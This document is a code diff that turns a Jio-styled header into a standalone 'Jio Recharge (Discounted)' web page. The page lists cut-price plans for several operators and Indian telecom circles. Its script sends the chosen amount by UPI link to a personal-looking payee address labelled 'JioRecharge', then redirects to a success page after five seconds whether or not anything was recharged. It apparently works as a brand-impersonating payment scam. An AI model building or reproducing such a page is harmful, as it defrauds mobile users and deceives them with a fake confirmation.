@@ -1,31 +1,94 @@
-<header class="jio-header">
-  <nav>
-    <img src="jio-logo.svg" alt="Jio"/>
-    <ul class="nav-menu">
-      <li>Mobile</li>
-      <li>True&nbsp;5G</li>
-      <li>New</li>
-    </ul>
-    <div class="icons">
-      <!-- Notification & Profile icons -->
-    </div>
-  </nav>
-</header>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Jio Recharge</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="container">
+    <h2>Jio Recharge (Discounted)</h2>
+    <form id="rechargeForm">
+      <input type="tel" id="mobile" placeholder="Enter Mobile Number" required />
 
-<section class="hero">
-  <h1>Recharge or Pay Bills</h1>
-  <div class="form-container">
-    <input> <!-- +91 dropdown, mobile input -->
-    <button>Recharge</button>
+      <select id="operator" required>
+        <option value="">Select Operator</option>
+        <option>Jio</option>
+        <option>Airtel</option>
+        <option>Vi</option>
+      </select>
+
+      <select id="circle" required>
+        <option value="">Select Circle</option>
+        <option>Andhra Pradesh</option>
+        <option>Arunachal Pradesh</option>
+        <option>Assam</option>
+        <option>Bihar</option>
+        <option>Chhattisgarh</option>
+        <option>Delhi</option>
+        <option>Goa</option>
+        <option>Gujarat</option>
+        <option>Haryana</option>
+        <option>Himachal Pradesh</option>
+        <option>Jammu & Kashmir</option>
+        <option>Jharkhand</option>
+        <option>Karnataka</option>
+        <option>Kerala</option>
+        <option>Madhya Pradesh</option>
+        <option>Maharashtra</option>
+        <option>Manipur</option>
+        <option>Meghalaya</option>
+        <option>Mizoram</option>
+        <option>Nagaland</option>
+        <option>Odisha</option>
+        <option>Punjab</option>
+        <option>Rajasthan</option>
+        <option>Sikkim</option>
+        <option>Tamil Nadu</option>
+        <option>Telangana</option>
+        <option>Tripura</option>
+        <option>Uttar Pradesh</option>
+        <option>Uttarakhand</option>
+        <option>West Bengal</option>
+      </select>
+
+      <select id="plan" required>
+        <option value="">Select Recharge Plan (Discounted)</option>
+        <option value="199">₹239 Plan – 1.5GB/day, 28 Days – ₹199</option>
+        <option value="249">₹299 Plan – 2GB/day, 28 Days – ₹249</option>
+        <option value="289">₹349 Plan – 2.5GB/day, 28 Days – ₹289</option>
+        <option value="399">₹479 Plan – 1.5GB/day, 56 Days – ₹399</option>
+        <option value="449">₹533 Plan – 2GB/day, 56 Days – ₹449</option>
+        <option value="549">₹666 Plan – 1.5GB/day, 84 Days – ₹549</option>
+        <option value="599">₹719 Plan – 2GB/day, 84 Days – ₹599</option>
+        <option value="849">₹999 Plan – 3GB/day, 84 Days – ₹849</option>
+        <option value="1999">₹2545 Plan – 1.5GB/day, 365 Days – ₹1999</option>
+      </select>
+
+      <button type="submit">Proceed to Pay</button>
+    </form>
   </div>
-</section>
 
-<section class="plan-filters">
-  <button class="chip active">Popular</button>
-  <button class="chip">True 5G</button>
-  <button class="chip">Top-up</button>
-</section>
+  <script>
+    document.getElementById("rechargeForm").addEventListener("submit", function(e) {
+      e.preventDefault();
 
-<section class="plan-cards">
-  <!-- Card: Price, data/day, validity, CTA -->
-</section>
+      const mobile = document.getElementById("mobile").value;
+      const amount = document.getElementById("plan").value;
+
+      if (!mobile || !amount) {
+        alert("Please fill all fields");
+        return;
+      }
+
+      const upi = `upi://pay?pa=hakimiwashifali@fam&pn=JioRecharge&am=${amount}&cu=INR&tn=Mobile:${mobile}`;
+      window.location.href = upi;
+
+      // After 5 seconds, redirect to success page
+      setTimeout(() => {
+        window.location.href = "success.html";
+      }, 5000);
+    });
+  </script>
+</body>
+</html>
